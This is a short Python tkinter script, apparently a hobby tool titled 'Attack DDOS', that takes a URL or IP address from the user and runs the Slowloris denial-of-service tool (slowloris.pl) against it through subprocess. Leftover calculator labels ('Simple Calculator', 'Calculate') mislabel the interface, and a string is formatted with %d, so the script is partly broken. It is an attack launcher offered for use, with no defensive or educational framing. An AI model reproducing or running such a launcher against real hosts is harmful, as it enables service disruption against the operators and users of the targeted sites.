#!/usr/bin/python
import tkinter as tk
from functools import partial
import subprocess
def call_result(startattack, target):
    objetive = (target.get())
    start = subprocess.call(["./slowloris.pl","-dns",(objetive),"-option"])
    startattack.config(text="The attack aimed to: %d" % objetive)
    return

windows = tk.Tk()
windows.geometry('400x200+100+200')
windows.title('Attack DDOS')

target = tk.StringVar()

labelTitle = tk.Label(windows, text="Simple Calculator").grid(row=0, column=2)
labelNum1 = tk.Label(windows, text="Enter a URL or Ip").grid(row=1, column=0)
labelResult = tk.Label(windows)
labelResult.grid(row=7, column=2)

entryNum1 = tk.Entry(windows, textvariable=target).grid(row=1, column=2)

call_result = partial(call_result, labelResult, target)
buttonCal = tk.Button(windows, text="Calculate", command=call_result).grid(row=3, column=0)
windows.mainloop()